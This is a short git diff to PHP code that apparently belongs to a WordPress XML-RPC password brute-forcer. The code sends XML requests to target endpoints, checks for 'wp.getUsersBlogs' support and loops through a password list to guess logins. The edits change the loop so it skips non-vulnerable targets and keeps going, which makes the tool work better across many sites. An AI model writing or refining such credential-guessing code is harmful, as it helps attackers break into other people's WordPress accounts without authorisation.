@@ -22,13 +22,13 @@ foreach ($endpoints as $endpoint) {
         $username = htmlspecialchars($username, ENT_XML1, 'UTF-8'); // format xml
         $brute->requestXml($endpoint, $fields);
         $result = $brute->getRequestResult();
-        
+
         if (!$result) {
-            continue; // target seems to be not vulnerable
+            continue; // not xml result check xmlrpc.php in your target lists
         }
 
         if (!$brute->searchArray('wp.getUsersBlogs', $result)) {
-            return false; // target seems to be not vulnerable
+            continue; // target seems to be not vulnerable
         }
 
         for ($x = 0; $x < $passwordListCount; $x++) {
